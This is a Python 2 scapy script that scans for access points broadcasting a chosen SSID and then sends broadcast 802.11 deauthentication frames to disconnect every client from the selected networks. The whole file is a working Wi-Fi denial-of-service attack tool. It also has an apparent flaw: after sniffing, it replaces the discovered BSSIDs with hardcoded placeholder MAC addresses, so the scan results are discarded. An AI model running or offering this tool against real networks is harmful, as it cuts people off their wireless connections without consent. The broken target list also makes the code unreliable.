#!/usr/bin/python

import sys
from scapy.all import *

target_bssids = []

def inspect_packet(pkt):
	if pkt.haslayer(Dot11Beacon):
		bssid = pkt.getlayer(Dot11).addr2
		if bssid not in target_bssids:
			ssid = pkt.getlayer(Dot11Beacon).payload.info
			if ssid == sys.argv[3]:
				target_bssids.append(bssid)

def deauth_clients(bssids):
	dst_mac = "ff:ff:ff:ff:ff:ff"
	for bssid in bssids:
		print "\nDeauthenticating clients from %s" % bssid
		pkt = (RadioTap() / Dot11(type=0, subtype=12, addr1=dst_mac, addr2=bssid, addr3=bssid) 
				/ Dot11Deauth(reason=1))
		sendp(pkt, iface=sys.argv[1], count=5, inter=0.2)

def select_bssids_to_deauth():
	print "\nBSSIDs found:"
	for i in range(len(target_bssids)):
		print str(i+1) + ') ' + target_bssids[i]
	print "99) All"
	selected_bssid = int(raw_input("\nSelect number: "))
	if selected_bssid == 99:
		deauth_clients(target_bssids)
	elif selected_bssid > 0 and selected_bssid <= len(target_bssids):
		deauth_clients([target_bssids[selected_bssid-1]])
	else:
		print "Invalid number!"
		select_bssids_to_deauth()

if __name__ == '__main__':
	if len(sys.argv) != 4:
		print "Use: %s <iface> <seconds> <ssid>" % sys.argv[0]
		sys.exit(0)

	print "Searching BSSIDs from %s..." % sys.argv[3]
	sniff(iface=sys.argv[1], prn=inspect_packet, timeout=int(sys.argv[2]))
	target_bssids = ['00:11:22:33:44:55', '11:22:33:44:55:66', '22:33:44:55:66:77', '33:44:55:66:77:88']
	select_bssids_to_deauth()